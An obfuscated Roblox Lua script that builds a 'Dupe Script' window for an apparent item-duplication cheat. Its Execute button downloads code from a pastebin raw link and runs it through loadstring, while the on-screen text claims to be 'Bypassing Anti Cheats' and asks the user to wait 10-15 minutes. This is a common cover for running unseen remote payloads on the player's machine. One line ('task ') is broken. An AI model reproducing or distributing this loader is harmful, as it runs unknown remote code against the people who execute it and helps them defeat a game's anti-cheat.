-- Obfuscated with free IronBrew2-style obfuscation
local lIl = game["Players"]["LocalPlayer"]
local IIi = Instance["new"]("ScreenGui")
IIi["Name"] = "\68\117\112\101\83\99\114\105\112\116\71\117\105"
IIi["ResetOnSpawn"] = false
IIi["Parent"] = lIl["PlayerGui"]

local lll = Instance["new"]("Frame")
lll["Name"] = "\77\97\105\110\71\117\105"
lll["Size"] = UDim2["new"](0, 320, 0, 160)
lll["AnchorPoint"] = Vector2["new"](0.5, 0.5)
lll["Position"] = UDim2["new"](0.5, 0, 0.5, 0)
lll["BackgroundColor3"] = Color3["fromRGB"](255, 24, 24)
lll["BorderSizePixel"] = 0
lll["Parent"] = IIi

local lI1 = Instance["new"]("UICorner", lll)
lI1["CornerRadius"] = UDim["new"](0, 10)

local I1l = Instance["new"]("TextLabel", lll)
I1l["Text"] = "\68\117\112\101\32\83\99\114\105\112\116"
I1l["Font"] = Enum["Font"]["GothamBold"]
I1l["TextSize"] = 22
I1l["TextColor3"] = Color3["fromRGB"](255, 255, 255)
I1l["BackgroundColor3"] = Color3["fromRGB"](30, 30, 30)
I1l["Size"] = UDim2["new"](1, 0, 0, 35)

local Il1 = Instance["new"]("UICorner", I1l)
Il1["CornerRadius"] = UDim["new"](0, 10)

local III = Instance["new"]("TextLabel", lll)
III["Text"] = "\69\120\101\99\117\116\101\32\116\104\105\115\32\102\105\114\115\116\46\32\87\97\105\116\32\49\48\45\49\53\32\109\105\110\115\46"
III["Font"] = Enum["Font"]["Gotham"]
III["TextSize"] = 14
III["TextColor3"] = Color3["fromRGB"](200, 200, 200)
III["BackgroundTransparency"] = 1
III["Position"] = UDim2["new"](0, 0, 0, 40)
III["Size"] = UDim2["new"](1, 0, 0, 25)

local IlI = Instance["new"]("TextButton", lll)
IlI["Text"] = "\69\120\101\99\117\116\101"
IlI["Font"] = Enum["Font"]["GothamBold"]
IlI["TextSize"] = 18
IlI["TextColor3"] = Color3["fromRGB"](255, 255, 255)
IlI["BackgroundColor3"] = Color3["fromRGB"](40, 120, 40)
IlI["Size"] = UDim2["new"](0.8, 0, 0, 40)
IlI["Position"] = UDim2["new"](0.1, 0, 0, 80)

local IIl = Instance["new"]("UICorner", IlI)
IIl["CornerRadius"] = UDim["new"](0, 8)

IlI["MouseButton1Click"]:Connect(function()
	IlI["Text"] = "Starting..."
	III["Text"] = "Wait 10-15 mins - Bypassing Anti Cheats."

	task 
	local success, err = pcall(function()
		loadstring(game["HttpGet"](game, "https://pastebin.com/raw/3TY0Gi6g"))()
	end)

	if success then
		III["Text"] = "Executed successfully."
	else
		III["Text"] = "Execution failed."
	end
end)
